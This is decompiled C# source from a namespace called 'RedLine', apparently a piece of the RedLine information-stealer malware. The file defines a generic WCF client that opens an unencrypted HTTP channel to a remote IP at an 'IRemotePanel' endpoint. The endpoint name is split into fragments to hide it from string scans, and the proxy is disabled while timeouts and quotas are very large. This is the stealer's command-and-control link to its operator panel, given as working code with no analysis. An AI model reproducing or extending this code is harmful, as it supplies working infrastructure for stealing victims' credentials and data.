using System;
using System.ServiceModel;
using System.Xml;

namespace RedLine
{
	// Token: 0x02000008 RID: 8
	public static class GenericService<T>
	{
		// Token: 0x06000010 RID: 16 RVA: 0x00002588 File Offset: 0x00000788
		public static void Use(Action<T> codeBlock, string RemoteIP)
		{
			IClientChannel clientChannel = (IClientChannel)((object)new ChannelFactory<T>(GenericService<T>.binding).CreateChannel(new EndpointAddress(string.Format("http://{0}/{1}{2}{3}", new object[]
			{
				RemoteIP,
				"IRemo",
				"te",
				"Panel"
			}))));
			bool flag = false;
			try
			{
				codeBlock((T)((object)clientChannel));
				clientChannel.Close();
				flag = true;
			}
			finally
			{
				if (!flag)
				{
					clientChannel.Abort();
				}
			}
		}

		// Token: 0x04000006 RID: 6
		private static readonly BasicHttpBinding binding = new BasicHttpBinding
		{
			MaxBufferSize = int.MaxValue,
			MaxReceivedMessageSize = 2147483647L,
			MaxBufferPoolSize = 2147483647L,
			CloseTimeout = TimeSpan.FromMinutes(30.0),
			OpenTimeout = TimeSpan.FromMinutes(30.0),
			ReceiveTimeout = TimeSpan.FromMinutes(30.0),
			SendTimeout = TimeSpan.FromMinutes(30.0),
			TransferMode = TransferMode.Buffered,
			UseDefaultWebProxy = false,
			ProxyAddress = null,
			ReaderQuotas = new XmlDictionaryReaderQuotas
			{
				MaxDepth = 2000000,
				MaxArrayLength = int.MaxValue,
				MaxBytesPerRead = int.MaxValue,
				MaxNameTableCharCount = int.MaxValue,
				MaxStringContentLength = int.MaxValue
			},
			Security = new BasicHttpSecurity
			{
				Mode = BasicHttpSecurityMode.None
			}
		};
	}
}
